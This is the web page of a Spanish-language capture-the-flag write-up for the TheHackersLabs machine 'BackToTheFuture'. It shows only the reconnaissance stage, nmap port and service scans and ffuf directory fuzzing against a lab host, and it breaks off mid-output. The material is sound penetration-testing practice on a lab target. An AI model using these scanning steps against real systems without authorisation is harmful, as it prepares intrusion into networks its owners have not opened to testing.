<!doctype html><html lang=en data-bs-theme=dark><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1"><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-regular.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-500.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/vendor/jost/jost-v4-latin-700.woff2 as=font type=font/woff2 crossorigin><script src=/js/dismissable-alert.ecfe60f33522da00acae2a7c5195ae0237f6bf736d4c295a83700bdbcb4d0263.js integrity="sha256-7P5g8zUi2gCsrip8UZWuAjf2v3NtTClag3AL28tNAmM="></script><link rel=stylesheet href="/main.dd2fff12d2cb2eeb6cec9bb175a78a97f9a9c75528b420c4ddf294b836e24e37beeb597c4163a46055726eb5b7baddc29de90ceda8f7b4d3d51ecc8bd55da2ba.css" integrity="sha512-3S//EtLLLuts7JuxdaeKl/mpx1UotCDE3fKUuDbiTje+61l8QWOkYFVybrW3ut3CnekM7aj3tNPVHsyL1V2iug==" crossorigin=anonymous><noscript><style>img.lazyload{display:none}</style></noscript><base href=/writeups/thehackerslabs/backtothefuture/><link rel=canonical href=/writeups/thehackerslabs/backtothefuture/><title>BackToTheFuture | Pylon</title>
<meta name=description content><link rel=icon href=/favicon.ico sizes=32x32><link rel=icon href=/favicon.svg type=image/svg+xml><link rel=apple-touch-icon href=/apple-touch-icon.png sizes=180x180 type=image/png><link rel=icon href=/favicon-192x192.png sizes=192x192 type=image/png><link rel=icon href=/favicon-512x512.png sizes=512x512 type=image/png><link rel=manifest href=/manifest.webmanifest><meta property="og:title" content="BackToTheFuture"><meta property="og:description" content="Enumeration Vamos a empezar con un escaneo nmap:
┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ nmap -p- --open -sS -n -Pn --min-rate=5000 -vvv 192.168.44.133 Starting Nmap 7."><meta property="og:type" content="article"><meta property="og:url" content="/writeups/thehackerslabs/backtothefuture/"><meta property="og:image" content="/cover.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-07-20T00:00:00+00:00"><meta property="article:modified_time" content="2025-07-20T00:00:00+00:00"><meta property="og:site_name" content="Pylon"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/cover.png"><meta name=twitter:title content="BackToTheFuture"><meta name=twitter:description content="Enumeration Vamos a empezar con un escaneo nmap:
┌──(pylon㉿kali)-[~/…/pylon/THL/BackToTheFuture/nmap] └─$ nmap -p- --open -sS -n -Pn --min-rate=5000 -vvv 192.168.44.133 Starting Nmap 7."><meta name=twitter:site content="@pylonetwork"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"/","name":"Pylon","position":1},{"@type":"ListItem","item":"/writeups/","name":"Bienvenido","position":2},{"@type":"ListItem","item":"/writeups/thehackerslabs/","name":"Thehackerslabs","position":3},{"@type":"ListItem","name":"Back to the Future","position":4}]}</script></head><body class="single section writeups" data-bs-spy=scroll data-bs-target=#toc data-bs-root-margin="0px 0px -60%" data-bs-smooth-scroll=true tabindex=0><div id=announcement data-id=global-alert-c83ee1e52a9ea33839072957647c51ff class="alert alert-primary alert-dismissible fade show text-center" role=alert><span class=alert-text>¡Nuevo writeup de la máquina "<a href=/writeups/thehackerslabs/backtothefuture/>BackToTheFuture</a>" de la plataforma TheHackersLabs!</span>
<button type=button class=btn-close data-bs-dismiss=alert aria-label=Close></button></div><div class=sticky-top><div class=header-bar></div><header class="navbar navbar-expand-lg"><div class=container-md><a class="navbar-brand me-auto me-lg-3" href=/>Pylon</a>
<button type=button id=searchToggleMobile class="btn btn-link nav-link mx-2 d-lg-none" aria-label="Search website">
<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
</button>
<button class="btn btn-link d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavSection aria-controls=offcanvasNavSection aria-label="Open section navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-dots-vertical" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 19m-1 0a1 1 0 102 0 1 1 0 10-2 0"/><path d="M12 5m-1 0a1 1 0 102 0 1 1 0 10-2 0"/></svg></button><div class="offcanvas offcanvas-start d-lg-none" tabindex=-1 id=offcanvasNavSection aria-labelledby=offcanvasNavSectionLabel><div class=header-bar></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavSectionLabel>Writeups</h5><button type=button class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class=offcanvas-body><aside class="doks-sidebar mt-n3"><nav id=doks-docs-nav aria-label="Tertiary navigation"><nav class="section-nav docs-links"><ul class=list-unstyled><li><details open><summary>INTRO</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/intro/bienvenido/ style=display:flex;align-items:center>👋 Bienvenido</a></li></ul></details></li><li><details open><summary>HACKTHEBOX</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackthebox/cap/ style=display:flex;align-items:center><img src=/images/icons/cap.png style=margin-right:6px width=21 height=auto>Cap</a></li></ul></details></li><li><details open><summary>DOCKERLABS</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/dockerlabs/eclipse/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Eclipse</a></li><li><a href=/writeups/dockerlabs/ejotapete/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Ejotapete</a></li><li><a href=/writeups/dockerlabs/upload/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Upload</a></li></ul></details></li><li><details open open><summary>THEHACKERSLABS</summary><ul class="list-unstyled list-nested"><li class=active><a aria-current=page href=/writeups/thehackerslabs/backtothefuture/ style=display:flex;align-items:center><img src=/images/icons/backtothefuture.png style=margin-right:6px width=21 height=auto>BackToTheFuture</a></li><li><a href=/writeups/thehackerslabs/pinguping/ style=display:flex;align-items:center><img src=/images/icons/pinguping.png style=margin-right:6px width=21 height=auto>PinguPing</a></li><li><a href=/writeups/thehackerslabs/bocatacalamares/ style=display:flex;align-items:center><img src=/images/icons/bocatacalamares.png style=margin-right:6px width=21 height=auto>BocataCalamares</a></li><li><a href=/writeups/thehackerslabs/jaulacon2025/ style=display:flex;align-items:center><img src=/images/icons/jaulacon2025.png style=margin-right:6px width=21 height=auto>JaulaCon2025</a></li><li><a href=/writeups/thehackerslabs/mortadela/ style=display:flex;align-items:center><img src=/images/icons/mortadela.png style=margin-right:6px width=21 height=auto>Mortadela</a></li><li><a href=/writeups/thehackerslabs/zapasguapas/ style=display:flex;align-items:center><img src=/images/icons/zapasguapas.png style=margin-right:6px width=21 height=auto>ZapasGuapas</a></li><li><a href=/writeups/thehackerslabs/fruits/ style=display:flex;align-items:center><img src=/images/icons/fruits.png style=margin-right:6px width=21 height=auto>Fruits</a></li></ul></details></li><li><details open><summary>VULNHUB</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/vulnhub/darkhole2/ style=display:flex;align-items:center><img src=/images/icons/vulnhub.png style=margin-right:6px width=21 height=auto>DarkHole 2</a></li></ul></details></li><li><details open><summary>HACKMYVM</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackmyvm/method/ style=display:flex;align-items:center><img src=/images/icons/method.png style=margin-right:6px width=21 height=auto>Method (Video)</a></li></ul></details></li></ul></nav></nav></aside></div></div><button class="btn btn-link nav-link mx-2 order-3 d-lg-none" type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasNavMain aria-controls=offcanvasNavMain aria-label="Open main navigation menu"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><line x1="4" y1="8" x2="20" y2="8"/><line x1="4" y1="16" x2="20" y2="16"/></svg></button><div class="offcanvas offcanvas-end h-auto" tabindex=-1 id=offcanvasNavMain aria-labelledby=offcanvasNavMainLabel><div class="header-bar d-lg-none"></div><div class=offcanvas-header><h5 class=offcanvas-title id=offcanvasNavMainLabel>Pylon</h5><button type=button class="btn btn-link nav-link p-0 ms-auto" data-bs-dismiss=offcanvas aria-label=Close><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div><div class="offcanvas-body d-flex flex-column flex-lg-row justify-content-between"><ul class="navbar-nav flex-grow-1"><li class=nav-item><a class="nav-link active" href=/writeups/intro/bienvenido/ aria-current=true>Writeups</a></li><li class=nav-item><a class=nav-link href=/challenges/intro/bienvenido/>Challenges</a></li><li class=nav-item><a class=nav-link href=/blog/>Blog</a></li></ul><button type=button id=searchToggleDesktop class="btn btn-link nav-link p-2 d-none d-lg-block" aria-label="Search website"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg></button><ul id=socialMenu class="nav mx-auto flex-row order-lg-4"><li class=nav-item><a class="nav-link social-link" href=https://github.com/Pylonet><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg><small class="ms-2 visually-hidden">GitHub</small></a></li></ul></div></div></div></header></div><div class=modal id=searchModal tabindex=-1 aria-labelledby=searchModalLabel aria-hidden=true><div class="modal-dialog modal-dialog-scrollable modal-fullscreen-md-down"><div class=modal-content><div class=modal-header><h1 class="modal-title fs-5 visually-hidden" id=searchModalLabel>Search</h1><button type=button class="btn-close visually-hidden" data-bs-dismiss=modal aria-label=Close></button><div class="search-input flex-grow-1 d-none"><form id=search-form class=search-form action=# method=post accept-charset=UTF-8 role=search><label for=query class=visually-hidden>Search</label><div class=d-flex><input type=search id=query name=query class="search-text form-control form-control-lg" placeholder=Search aria-label=Search maxlength=128 autocomplete=off>
<button type=button class="btn btn-link text-decoration-none px-0 ms-3 d-md-none" data-bs-dismiss=modal aria-label=Close>Cancel</button></div></form></div></div><div class=modal-body><p class="search-loading status message d-none mt-3 text-center">Loading search index…</p><p class="search-no-recent message d-none mt-3 text-center">No recent searches</p><p class="search-no-results message d-none mt-3 text-center">No results for "<strong><span class=query-no-results>Query here</span></strong>"</p><div id=searchResults class=search-results></div><template><article class="search-result list-view"><div class="card my-3"><div class=card-body><header><h2 class="h5 title title-submitted mb-0"><a class="stretched-link text-decoration-none text-reset" href=#>Title here</a></h2><div class=submitted><time class=created-date>Date here</time></div></header><div class=content>Summary here</div></div></div></article></template></div><div class=modal-footer><ul class="list-inline me-auto d-none d-md-block"><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd><span class=DocSearch-Label>to select</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd><kbd class=me-2><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd><span class=DocSearch-Label>to navigate</span></li><li class=list-inline-item><kbd class=me-2><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd><span class=DocSearch-Label>to close</span></li></ul><p class=d-md-none>Search by <a class=text-decoration-none href=https://github.com/nextapps-de/flexsearch>FlexSearch</a></p></div></div></div></div><div class="wrap container-md" role=document><div class=content><div class="row flex-xl-nowrap"><div class="col-lg-5 col-xl-4 docs-sidebar docs-sidebar-offset d-none d-lg-block"><nav class="section-nav docs-links"><ul class=list-unstyled><li><details open><summary>INTRO</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/intro/bienvenido/ style=display:flex;align-items:center>👋 Bienvenido</a></li></ul></details></li><li><details open><summary>HACKTHEBOX</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackthebox/cap/ style=display:flex;align-items:center><img src=/images/icons/cap.png style=margin-right:6px width=21 height=auto>Cap</a></li></ul></details></li><li><details open><summary>DOCKERLABS</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/dockerlabs/eclipse/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Eclipse</a></li><li><a href=/writeups/dockerlabs/ejotapete/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Ejotapete</a></li><li><a href=/writeups/dockerlabs/upload/ style=display:flex;align-items:center><img src=/images/icons/dockerlabs.png style=margin-right:6px width=21 height=auto>Upload</a></li></ul></details></li><li><details open open><summary>THEHACKERSLABS</summary><ul class="list-unstyled list-nested"><li class=active><a aria-current=page href=/writeups/thehackerslabs/backtothefuture/ style=display:flex;align-items:center><img src=/images/icons/backtothefuture.png style=margin-right:6px width=21 height=auto>BackToTheFuture</a></li><li><a href=/writeups/thehackerslabs/pinguping/ style=display:flex;align-items:center><img src=/images/icons/pinguping.png style=margin-right:6px width=21 height=auto>PinguPing</a></li><li><a href=/writeups/thehackerslabs/bocatacalamares/ style=display:flex;align-items:center><img src=/images/icons/bocatacalamares.png style=margin-right:6px width=21 height=auto>BocataCalamares</a></li><li><a href=/writeups/thehackerslabs/jaulacon2025/ style=display:flex;align-items:center><img src=/images/icons/jaulacon2025.png style=margin-right:6px width=21 height=auto>JaulaCon2025</a></li><li><a href=/writeups/thehackerslabs/mortadela/ style=display:flex;align-items:center><img src=/images/icons/mortadela.png style=margin-right:6px width=21 height=auto>Mortadela</a></li><li><a href=/writeups/thehackerslabs/zapasguapas/ style=display:flex;align-items:center><img src=/images/icons/zapasguapas.png style=margin-right:6px width=21 height=auto>ZapasGuapas</a></li><li><a href=/writeups/thehackerslabs/fruits/ style=display:flex;align-items:center><img src=/images/icons/fruits.png style=margin-right:6px width=21 height=auto>Fruits</a></li></ul></details></li><li><details open><summary>VULNHUB</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/vulnhub/darkhole2/ style=display:flex;align-items:center><img src=/images/icons/vulnhub.png style=margin-right:6px width=21 height=auto>DarkHole 2</a></li></ul></details></li><li><details open><summary>HACKMYVM</summary><ul class="list-unstyled list-nested"><li><a href=/writeups/hackmyvm/method/ style=display:flex;align-items:center><img src=/images/icons/method.png style=margin-right:6px width=21 height=auto>Method (Video)</a></li></ul></details></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#shell-as-www-data>Shell as www-data</a></li><li><a href=#shell-as-marty>Shell as marty</a></li><li><a href=#shell-as-docbrown>Shell as docbrown</a></li><li><a href=#shell-as-root>Shell as root</a></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><h1></h1><div style=display:flex;align-items:center><div style="border-left:8px solid #f49b0a;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>BackToTheFuture</h1></div><div style=display:flex;align-items:center;vertical-align:middle;margin-top:15px;margin-bottom:25px><img src=/images/logos/linux.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/images/logos/thl.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a></li><li><a href=#shell-as-www-data>Shell as www-data</a></li><li><a href=#shell-as-marty>Shell as marty</a></li><li><a href=#shell-as-docbrown>Shell as docbrown</a></li><li><a href=#shell-as-root>Shell as root</a></li></ul></nav></div></details></nav><h2 id=enumeration>Enumeration<a href=#enumeration class=anchor aria-hidden=true>#</a></h2><p>Vamos a empezar con un escaneo <code>nmap</code>:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ nmap -p- --open -sS -n -Pn --min-rate<span class=o>=</span><span class=m>5000</span> -vvv 192.168.44.133
</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-07-20 13:16 CEST
</span></span><span class=line><span class=cl>Initiating ARP Ping Scan at 13:16
</span></span><span class=line><span class=cl>Scanning 192.168.44.133 <span class=o>[</span><span class=m>1</span> port<span class=o>]</span>
</span></span><span class=line><span class=cl>Completed ARP Ping Scan at 13:16, 0.04s elapsed <span class=o>(</span><span class=m>1</span> total hosts<span class=o>)</span>
</span></span><span class=line><span class=cl>Initiating SYN Stealth Scan at 13:16
</span></span><span class=line><span class=cl>Scanning 192.168.44.133 <span class=o>[</span><span class=m>65535</span> ports<span class=o>]</span>
</span></span><span class=line><span class=cl>Discovered open port 22/tcp on 192.168.44.133
</span></span><span class=line><span class=cl>Discovered open port 3306/tcp on 192.168.44.133
</span></span><span class=line><span class=cl>Discovered open port 80/tcp on 192.168.44.133
</span></span><span class=line><span class=cl>Discovered open port 21/tcp on 192.168.44.133
</span></span><span class=line><span class=cl>Completed SYN Stealth Scan at 13:16, 0.70s elapsed <span class=o>(</span><span class=m>65535</span> total ports<span class=o>)</span>
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.44.133
</span></span><span class=line><span class=cl>Host is up, received arp-response <span class=o>(</span>0.00067s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Scanned at 2025-07-20 13:16:17 CEST <span class=k>for</span> 1s
</span></span><span class=line><span class=cl>Not shown: <span class=m>65531</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE REASON
</span></span><span class=line><span class=cl>21/tcp   open  ftp     syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>22/tcp   open  ssh     syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>3306/tcp open  mysql   syn-ack ttl <span class=m>64</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:79:B9:22 <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Read data files from: /usr/share/nmap
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 0.87 seconds
</span></span><span class=line><span class=cl>           Raw packets sent: <span class=m>65536</span> <span class=o>(</span>2.884MB<span class=o>)</span> <span class=p>|</span> Rcvd: <span class=m>65536</span> <span class=o>(</span>2.621MB<span class=o>)</span></span></span></code></pre></div></figure></div><p>Vemos que tiene varios puertos abiertos, vamos a realizar un segundo escaneo para determinar el servicio y versión que corre en el puerto:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ nmap -p21,22,80,3306 -sCV 192.168.44.133
</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-07-20 15:34 CEST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.44.133
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00013s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp   open  ftp     vsftpd 3.0.3
</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> fc:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.62
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://hillvalley.thl/
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.62 <span class=o>(</span>Debian<span class=o>)</span>
</span></span><span class=line><span class=cl>3306/tcp open  mysql   MariaDB 10.3.23 or earlier <span class=o>(</span>unauthorized<span class=o>)</span>
</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:79:B9:22 <span class=o>(</span>VMware<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: Host: _default_<span class=p>;</span> OSs: Unix, Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 7.47 seconds</span></span></code></pre></div></figure></div><p>Vemos que tiene un dominio configurado <code>hillvalley.thl</code>, vamos a añadirlo en nuestro <code>/etc/hosts</code>:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><pre tabindex=0><code>192.168.44.133 hillvalley.thl</code></pre></figure></div><p>Vamos a ver la aplicación web:</p><figure><img srcset=data:image/webp;base64,UklGRi4AAABXRUJQVlA4ICIAAACQAQCdASoQAAkAAph8J6QAAudUxLAA/uRp7WHJRmOUcAAA data-srcset="/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_1918x0_resize_q85_h2_lanczos_3.webp 1918w" data-sizes=auto src=/images/thl/backtothefuture/1_hua7cf4c1827dac37205cd316628b879fe_72330_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1918 height=1074 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que hay un login, antes de probar cualquier cosa vamos a realizar un fuzzing para ver si hay más cosas en la aplicación:</p><div class=expressive-code><figure class="frame is-terminal not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>pylon㉿kali<span class=o>)</span>-<span class=o>[</span>~/…/pylon/THL/BackToTheFuture/nmap<span class=o>]</span>
</span></span><span class=line><span class=cl>└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u <span class=s2>&#34;http://hillvalley.thl/FUZZ&#34;</span> -e .php,.html,.txt,.js
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/
</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/
</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\
</span></span></span><span class=line><span class=cl><span class=se></span>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>       v2.1.0-dev
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> :: Method           : GET
</span></span><span class=line><span class=cl> :: URL              : http://hillvalley.thl/FUZZ
</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</span></span><span class=line><span class=cl> :: Extensions       : .php .html .txt .js
</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class=line><span class=cl>________________________________________________
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>index.php               <span class=o>[</span>Status: 200, Size: 2948, Words: 656, Lines: 69, Duration: 3ms<span class=o>]</span>
</span></span><span class=line><span class=cl>about.php               <span class=o>[</span>Status: 200, Size: 240, Words: 26, Lines: 3, Duration: 0ms<span class=o>]</span>
</span></span><span class=line><span class=cl>img                     <span class=o>[</span>Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms<span class=o>]</span>
